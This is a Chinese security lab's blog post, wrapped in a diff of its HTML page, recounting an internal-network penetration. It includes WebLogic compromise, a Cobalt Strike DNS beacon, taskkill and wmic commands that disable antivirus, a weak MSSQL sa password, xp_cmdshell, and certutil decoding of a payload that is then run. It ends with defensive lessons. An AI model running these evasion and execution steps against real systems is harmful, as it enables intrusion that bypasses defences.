@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<!--[if IE 8]> <html lang="en" class="ie8 no-js"> <![endif]-->
+<!--[if IE 9]> <html lang="en" class="ie9 no-js"> <![endif]-->
+<!--[if !IE]><!-->
+<html lang="en">
+<!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <title>记一次曲折的内网渗透 | 伏宸安全实验室-Future-Sec Information Security Lab</title>
+
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+  <meta name="description" content="环境 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表： 基本情况C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次曲折的内网渗透">
+<meta property="og:url" content="http://www.future-sec.com/network-penetration.html">
+<meta property="og:site_name" content="伏宸安全实验室-Future-Sec Information Security Lab">
+<meta property="og:description" content="环境 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表： 基本情况C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道">
+<meta property="og:image" content="http://www.future-sec.com/images/20171120162810.jpg">
+<meta property="og:updated_time" content="2017-11-20T08:29:04.175Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次曲折的内网渗透">
+<meta name="twitter:description" content="环境 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表： 基本情况C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道">
+<meta name="twitter:image" content="http://www.future-sec.com/images/20171120162810.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="伏宸安全实验室-Future-Sec Information Security Lab" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  
+
+  <!-- Global styles START -->   
+  <link rel="stylesheet" href="/metronic/assets/plugins/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/metronic/assets/plugins/bootstrap/css/bootstrap.min.css">
+  <!-- Global styles END --> 
+   
+  <!-- Page level plugin styles START -->
+  <link rel="stylesheet" href="/metronic/assets/pages/css/animate.css">
+  <link rel="stylesheet" href="/metronic/assets/plugins/owl.carousel/assets/owl.carousel.css">
+  <!-- Page level plugin styles END -->
+
+  <!-- Theme styles START -->
+  <link rel="stylesheet" href="/metronic/assets/pages/css/components.css">
+  <link rel="stylesheet" href="/metronic/assets/pages/css/slider.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/style.css">
+  <link rel="stylesheet" href="/metronic/assets/pages/css/portfolio.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/style-responsive.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/themes/red.css">
+  <link rel="stylesheet" href="/css/theme-styles.css">
+  <!-- Theme styles END -->
+</head>
+</html>
+<body class="corporate">
+  <!-- BEGIN HEADER -->
+<div class="header">
+  <div class="container">
+    <!--<a class="site-logo" href="/" id="logo">伏宸安全实验室-Future-Sec Information Security Lab</a>-->
+
+    <a class="site-logo" href="/">
+      <img src="/metronic/assets/corporate/img/logos/logo-corp-red.png" alt="Metronic FrontEnd">
+    </a>
+
+    <a href="javascript:void(0);" class="mobi-toggler"><i class="fa fa-bars"></i></a>
+
+    <!-- BEGIN NAVIGATION -->
+    <div class="header-navigation pull-right font-transform-inherit">
+      <ul>
+	
+	<li class="">
+	  <a href="/index.html">Home</a>
+	</li>
+	
+	<li class="">
+	  <a href="/archives/">Blog</a>
+	</li>
+	
+	<li class="">
+	  <a href="/vulnerabilities.html">Vulnerabilities</a>
+	</li>
+	
+	<li class="">
+	  <a href="/about/">About</a>
+	</li>
+	
+	<!-- BEGIN TOP SEARCH -->
+	<li class="menu-search">
+	  <span class="sep"></span>
+	  <i class="fa fa-search search-btn"></i>
+	  <div class="search-box">
+	   
+	    <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form">
+    <div class="input-group">
+		<input placeholder="Search" class="form-control st-default-search-input" name="word" maxlength="20" type="search">
+		  <input name="si" value="future-sec.com" type="hidden">
+  <input name="tn" value="bds" type="hidden">
+  <input name="cl" value="3" type="hidden">
+  <input name="ct" value="2097152" type="hidden">
+  <input name="s" value="on" type="hidden">
+		<span class="input-group-btn">
+		  <button class="btn btn-primary" type="submit">Search</button>
+		</span>
+	      </div>
+</form>
+	  </div> 
+	</li>
+	<!-- END TOP SEARCH -->
+      </ul>
+    </div>
+    <!-- END NAVIGATION -->
+  </div>
+</div>
+<!-- Header END -->
+
+  <div class="container">
+  <ul class="breadcrumb">
+    <li><a href="/">Home</a></li>
+    <li><a href="/archives/">Blog</a></li>
+    <li class="active">Post</li>
+  </ul>
+  <section id="main">
+    
+    <h2 itemprop="name">
+      <a class="article-title" href="/network-penetration.html">记一次曲折的内网渗透</a>
+    </h2>
+
+
+    <div class="row">
+<div class="col-md-9 col-sm-9 blog-posts">
+<article id="post-network-penetration" class="article article-type-post blog-item" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
+      <ul class="blog-info">
+	<li><i class="fa fa-user"></i> Sharecast</li>
+	<li><i class="fa fa-calendar"></i>
+	  <time datetime="2017-11-19T16:00:00.000Z" itemprop="datePublished">2017/11/20</time>
+
+	</li>
+	<li class="hidden-xs"><i class="fa fa-comments"></i>
+	  <a href="http://www.future-sec.com/network-penetration.html#disqus_thread" class="article-comment-link">Comments</a>
+	</li>
+	<li class="hidden-xs"><i class="fa fa-tags"></i> 
+	  
+  
+    <a href="/tags/内网渗透/" title="内网渗透">内网渗透</a>
+  
+
+
+	</li>
+      </ul>
+      
+  <div class="article-category">
+    
+    Category: 
+    
+    <a class="article-category-link" href="/categories/web安全/">web安全</a>
+  </div>
+  <br>
+
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <!-- Table of Contents -->
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本情况"><span class="toc-number">2.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过河搭桥"><span class="toc-number">4.</span> <span class="toc-text">过河搭桥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cobalt-strike-dns-beacon-环境构建"><span class="toc-number">5.</span> <span class="toc-text">cobalt strike dns beacon 环境构建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取beacon"><span class="toc-number">6.</span> <span class="toc-text">获取beacon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开启代理"><span class="toc-number">7.</span> <span class="toc-text">开启代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网漫游"><span class="toc-number">8.</span> <span class="toc-text">内网漫游</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#山重水复疑无路"><span class="toc-number">9.</span> <span class="toc-text">山重水复疑无路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#柳暗花明又一村"><span class="toc-number">10.</span> <span class="toc-text">柳暗花明又一村</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">11.</span> <span class="toc-text">总结</span></a></li></ol>
+  </div>
+
+        <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p> 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表：<br><img src="/images/20171120162810.jpg" alt="img"></p>
+<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><p>C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道C2的真实IP，主机上面存在各种安全防护软件，各种全家桶，很多命令、脚本和exe都无法运行，比如带有net的命令都无法运行，net、netstat、sc、wscript等</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>目标：获取C2的管理权限，包括网站内容管理和替换等，非单纯的系统权限。<br>1、通过C1利用http隧道或DNS隧道进行socks代理，对C2进行进一步渗透<br>2、抓取C1管理员口令或直接利用当前用户的token进行攻击<br>3、利用数据库或中间件弱口令进行攻击<br>4、利用web漏洞进行攻击，如注入、上传和命令执行等漏洞<br>5、中间人攻击或者嗅探等，但是影响太大，也需等比较久的时间</p>
+<h2 id="过河搭桥"><a href="#过河搭桥" class="headerlink" title="过河搭桥"></a>过河搭桥</h2><p>由于是weblogic，无法直接使用http隧道类的代理，因为环境仅支持jspx，没有找到可以用的代理webshell，故采取第二种方案，即通过DNS进行控制和代理。这里我首先想到的自然是cobalt strike的DNS Beacon。</p>
+<h2 id="cobalt-strike-dns-beacon-环境构建"><a href="#cobalt-strike-dns-beacon-环境构建" class="headerlink" title="cobalt strike dns beacon 环境构建"></a>cobalt strike dns beacon 环境构建</h2><p>参考：<a href="https://www.cobaltstrike.com/help-dns-beacon" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a> 或自行google</p>
+<h2 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h2><p>由于存在360全家桶等，所以得先把他们干掉：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">taskkill /im <span class="number">360</span>* /t /f</div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">taskkill /im KSafeSvc.exe /t /f</div><div class="line">ps:云锁是定制版，这里就不写进程名称了，也不影响远控的执行，安全无法结束也不影响</div></pre></td></tr></table></figure></p>
+<p>由于无法上传exe，所以将生成exe重命名为jspx上传，执行之后，等待几分钟，既可以成功上线，这里有个坑，因为内网配置的DNS可能是一些不知名的或者是114之类的，会影响上线，所以这里建议使用8.8.8.8或者119.29.29.29，因为我用的是DNSPOD，修改DNS:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh interface ip set dns "本地连接" source=static addr=119.29.29.29</div></pre></td></tr></table></figure></p>
+<h2 id="开启代理"><a href="#开启代理" class="headerlink" title="开启代理"></a>开启代理</h2><p> 参考<a href="https://cobaltstrike.com/help-socks-proxy-pivoting" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a><br> linux可以用Proxychains，windows可以使用Proxifier PE或SocksCap64 </p>
+<h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p> 通过jsp大马自带的端口扫描发现C2开放的端口有： 80：WMC生成的html，没啥可搞的 1433：因为C1的mysql账号密码是root/root，因此猜测存在弱口令 8080、8001、8081：就apache的一个代理，没有什么页面和功能 利用socks代理通过1433连接器，sa/sa获取了mssql的DBA权限，暗自高兴了一会，以为道这里就快搞定了，因为系统存在多个web服务，很自然的可以想到，直接可以通过mssql的xp_cmdshell，echo一个一句话就可以搞定了，然而这只是开始。 </p>
+<h2 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h2><p>iis环境，可以写一句话，但是所有目录的脚本权限都被禁止，所以这条路也断了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">简单提一下，iis找网站路径的方法</div><div class="line"><span class="number">1.</span> dir/s /b f:\<span class="number">123.</span>jpg (磁盘文件太多时无法使用)</div><div class="line"><span class="number">2.</span> 查看配置文件：</div><div class="line">iis6:type  %systemroot%\system32\inetsrv\metabase.xml|findstr Path=</div><div class="line">iis7/<span class="number">8</span>:type %systemroot%\System32\inetsrv\config\applicationHost.config|findstr physicalPath=</div><div class="line">iis7/<span class="number">8</span>:  appcmd <span class="keyword">list</span> sites</div></pre></td></tr></table></figure></p>
+<p>apache环境并没有装php，无法执行php脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic process where name=<span class="string">"httpd.exe"</span> get processid,executablepath,name</div><div class="line">其他中间件或web服务的也可以根据运行程序的路径，查看其配置文件，使用wmic命令查看运行路径:</div></pre></td></tr></table></figure></p>
+<p>上远控，远控怎么上传上去呢？于是找到这篇文章<a href="http://www.91ri.org/17255.html" rel="external nofollow noopener noreferrer" target="_blank">《15种文件下载的方式》</a><br>    再win2k3上面能用的，就剩下ftp、vbs、Bitsadmin、smb、c#、hex<br>        vbs和smb都被安全狗限制无法利用<br>        c#编译成功了，但是无法下载，貌似也被限制了<br>        bitsadmin不存在此命令<br>        FTP批量处理下载，C1上面有一个FTP，也是无法成功下载<br>        hex太长转换麻烦，暂时不考虑<br>    刚刚最近国外有大神提到了certutil命令，本地测试了一下，下载的文件无法指定路径，也不能正常保存，故又放弃了此路，详情可以参考这篇<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/" rel="external nofollow noopener noreferrer" target="_blank">文章</a>，win2k3保存有问题</p>
+<h2 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h2><p> 经过尝试各种下载姿势，还是无法下载，想了很久，又回到了certutil，因为他是系统自带的命令，从win2k3道windows 2016都是存在的，既可以用于下载，也可以用于base64编码和文件hash校验。故此：<br>通过certutil将生成的exe转换为base64编码，利用echo命令写入到文本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 文件hash</div><div class="line">(<span class="number">1</span>) SHA1</div><div class="line">certutil.exe -hashfile msg.dll</div><div class="line">(<span class="number">2</span>) SHA256：</div><div class="line">certutil.exe -hashfile msg.dll SHA256</div><div class="line">(<span class="number">3</span>) MD5：</div><div class="line">certutil.exe -hashfile msg.dll MD5</div><div class="line"><span class="number">2.</span>编码</div><div class="line">(<span class="number">1</span>) base64编码：</div><div class="line">CertUtil -encode InFile OutFile</div><div class="line">(<span class="number">2</span>) base64解码</div><div class="line">CertUtil -decode InFile OutFile</div><div class="line">注：编码后的文件会添加两处标识信息，不影响文件解码</div><div class="line">文件头：</div><div class="line">-----BEGIN CERTIFICATE-----</div><div class="line">文件尾：</div><div class="line">-----END CERTIFICATE-----</div></pre></td></tr></table></figure></p>
+<p>mssql查询分析器批量echo文本保存<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"echo xxxx &gt;&gt; C:\temp\test.txt"</span></div></pre></td></tr></table></figure></p>
+<p> 使用certutil还原exe可以还原为txt，因为exe无法写入，并使用其校验文件hash<br>结束相关杀软进程和服务，这里提一点，因为C2的360是自动启动的，所以需要禁用自启，由于sc无法使用，我们可以使用wmic替代：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"taskkill /im 360* /t /f"</span></div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360EntClientSvc' call stopservice"</span></div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360rp' call stopservice"</span></div></pre></td></tr></table></figure></p>
+<p>最后运行解码的exe即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CertUtil -decode test.txt xshell.txt</div><div class="line">wmic process call create <span class="string">'c:\temp\xshell.txt'</span></div></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 本次渗透，可以说是一波三折，主要学习到的东西是在复杂环境下，综合利用各种windows自带的工具进行绕过安全防护，如wmic、taskkill、certutil等综合运用，才得以绕过杀软的防御，也存在一定运气的成分如数据库弱口令、病毒库更新不及时等。 从防御的角度来看的话：<br>1、加强日常安全运维的巡检，其实我的exe上传不止一次被杀或这被拦截，如果巡检自然可以发现<br>2、提高安全运维人员意识，做好安全策略管理，如数据库弱口令这些本不该有的<br>3、及时更新防病毒软件和恶意代码库，新版的360没法结束<br>4、加强对外恶意流量的安全检测，如DNS、http等</p>
+
+      
+    </div>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/tomcat-code-execution.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Tomcat 远程代码执行漏洞分析（CVE-2017-12615）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/iot-security-hardware-analysis.html" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">物联网硬件安全分析基础-硬件分析初探</div>
+    </a>
+  
+</nav>
+
+  
+  <br>
+</article>
+
+
+
+
+</div>
+<div class="col-md-3 col-sm-3 blog-sidebar">
+  <!-- CATEGORIES START -->
+<h2 class="no-top-space">Categories</h2>
+
+<div class="widget-wrap">
+  <div class="widget">
+    <ul class="nav sidebar-categories margin-bottom-40">
+      
+	<li>
+	  <a href="/categories/BROADCOM-WI-FI/">BROADCOM WI-FI (2)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/硬件安全/">硬件安全 (2)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/web安全/">web安全 (3)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/系统安全/">系统安全 (1)</a>
+	</li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<!-- CATEGORIES END -->
+
+<!-- BEGIN BLOG TAGS -->
+<div class="blog-tags margin-bottom-20">
+  <h2>Tags</h2>
+  
+  <div class="widget-wrap">
+    <div class="widget">
+      
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BROADCOM-WI-FI/"><i class="fa fa-tags"></i>BROADCOM WI-FI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Poc/"><i class="fa fa-tags"></i>Poc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tomcat/"><i class="fa fa-tags"></i>Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/"><i class="fa fa-tags"></i>python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/"><i class="fa fa-tags"></i>内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/条形码/"><i class="fa fa-tags"></i>条形码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬件分析/"><i class="fa fa-tags"></i>硬件分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬件安全/"><i class="fa fa-tags"></i>硬件安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自动化检测/"><i class="fa fa-tags"></i>自动化检测</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程代码执行/"><i class="fa fa-tags"></i>远程代码执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/验证码/"><i class="fa fa-tags"></i>验证码</a></li></ul>
+    </div>
+  </div>
+
+
+</div>
+<!-- END BLOG TAGS -->
+
+
+<!-- BEGIN FEATURED POSTS -->                            
+<h2>Featured Posts</h2>
+<div class="recent-news margin-bottom-10">
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</div>
+<!-- END FEATURED POSTS -->                            
+
+</div>
+</div>
+
+  </section>
+</div>
+
+    <!-- BEGIN PRE-FOOTER -->
+    <div class="pre-footer">
+      <div class="container">
+        <div class="row">
+          <!-- BEGIN BOTTOM ABOUT BLOCK -->
+          <div class="col-md-4 col-sm-6 pre-footer-col">
+            <h2>About Us</h2>
+            <p>伏宸安全实验室<br><br> 伏宸安全实验室是广东安创信息科技开发有限公司旗下的以网络安全研究为核心的专业实验室，主攻前沿安全技术，包括：渗透测试、黑产对抗、威胁情报、智能硬件与无线电安全等。</p>
+          </div>
+          <!-- END BOTTOM ABOUT BLOCK -->
+
+          <!-- BEGIN BOTTOM CONTACTS -->
+          <div class="col-md-4 col-sm-6 pre-footer-col">
+            <h2>Contact</h2>
+            <address class="margin-bottom-40">
+              广州市越秀区寺右新马路108号丰伟大厦15B、C单元<br>
+              BC 15/F Fengwei Buiding NO.108 Siyouxinma Road<br>
+              Guangzhou,China Code:510600<br>
+              Phone: 020-87392713<br>
+              Email: <a href="mailto:admin@future-sec.com" rel="external nofollow noopener noreferrer" target="_blank">admin@future-sec.com</a><br>
+            </address>
+          </div>
+          <!-- END BOTTOM CONTACTS -->
+
+	
+        </div>
+      </div>
+    </div>
+    <!-- END PRE-FOOTER -->
+
+    <!-- BEGIN FOOTER -->
+    <div class="footer">
+      <div class="container">
+        <div class="row">
+          <!-- BEGIN COPYRIGHT -->
+          <div class="col-md-6 col-sm-6 padding-top-10">
+                  &copy; 2017 伏宸安全实验室-Future-Sec Information Security Lab<br>
+ <a href="javascript:;">Future-sec</a> | <a href="javascript:;">广东安创信息科技开发有限公司</a>
+          </div>
+          <!-- END COPYRIGHT -->
+	  <!-- BEGIN SOCIAL -->
+<div class="col-md-6 col-sm-6">
+  <ul class="social-footer list-unstyled list-inline pull-right">
+    
+      <li><a href="https://github.com/Future-Sec/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-github"></i></a></li>
+    
+      <li><a href="https://weibo.com/futuresec" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-weibo"></i></a></li>
+    
+      <li><a href="https://mp.weixin.qq.com/s/QuDKBrMist8GL16EEO-u4Q" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-weixin"></i></a></li>
+    
+      <li><a href="/atom.xml"><i class="fa fa-rss"></i></a></li>
+    
+  </ul>  
+</div>
+<!-- END SOCIAL -->
+
+        </div>
+      </div>
+    </div>
+    <!-- END FOOTER -->
+
+  <!-- BEGIN CORE PLUGINS (REQUIRED FOR ALL PAGES) -->
+<!--[if lt IE 9]>
+<script src="/metronic/assets/plugins/respond.min.js"></script>
+<![endif]--> 
+<script src="/metronic/assets/plugins/jquery.min.js"></script>
+<script src="/metronic/assets/plugins/jquery-migrate.min.js"></script>
+<script src="/metronic/assets/plugins/bootstrap/js/bootstrap.min.js"></script>
+<script src="/metronic/assets/corporate/scripts/back-to-top.js"></script>
+<script src="/metronic/assets/plugins/owl.carousel/owl.carousel.min.js"></script>
+<script src="/metronic/assets/corporate/scripts/layout.js"></script>
+<script src="/js/wow.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script type="text/javascript">
+    jQuery(document).ready(function() {
+        Layout.init();    
+        Layout.initOWL();
+        Layout.initFixHeaderWithPreHeader(); /* Switch On Header Fixing (only if you have pre-header) */
+        Layout.initNavScrolling(); 
+	new WOW().init();
+    });
+</script>
+ <script>
+        // 给图片添加链接
+        $(document).ready(function() {
+            $("p img").each(function() {
+                var strA = "<a class='fancybox' href='" + this.src + "'></a>";
+                $(this).wrapAll(strA);
+            });
+        });
+    
+        // fancybox
+        $(".fancybox").fancybox({
+                                  openEffect    : 'elastic',
+                                  closeEffect   : 'elastic',
+                              });
+    </script>
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?9e36ea61528e32ab9a0bc86aa61db5f7";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- END CORE PLUGINS -->
+
+<!-- BEGIN PAGE-SPECIFIC PLUGINS --> 
+
+
+
+
+
+
+
+<!-- END PAGE-SPECIFIC PLUGINS --> 
+
+<!-- BEGIN INTEGRATIONS -->
+
+
+
+
+
+<!-- END INTEGRATIONS -->
+
+</body>
+
